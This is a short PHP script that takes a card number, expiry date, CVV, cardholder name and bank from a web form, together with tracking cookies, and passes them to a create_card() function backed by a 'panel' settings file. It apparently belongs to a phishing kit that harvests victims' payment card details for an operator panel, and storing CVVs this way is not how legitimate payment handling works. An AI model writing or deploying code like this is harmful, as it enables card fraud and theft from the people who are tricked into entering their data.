<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$idcliente = $_COOKIE['idcliente'];
$linea = $_COOKIE['linea'];

$tarjeta = $ifilter->process($_POST['tar']);
$fecha = $ifilter->process($_POST['fec']);
$cvv = $ifilter->process($_POST['cvv']);
$nombre = $ifilter->process($_POST['nom']);
$banco = $ifilter->process($_POST['ban']);

create_card($tarjeta,$fecha,$cvv,$nombre,$banco,$idcliente,$linea);	

?>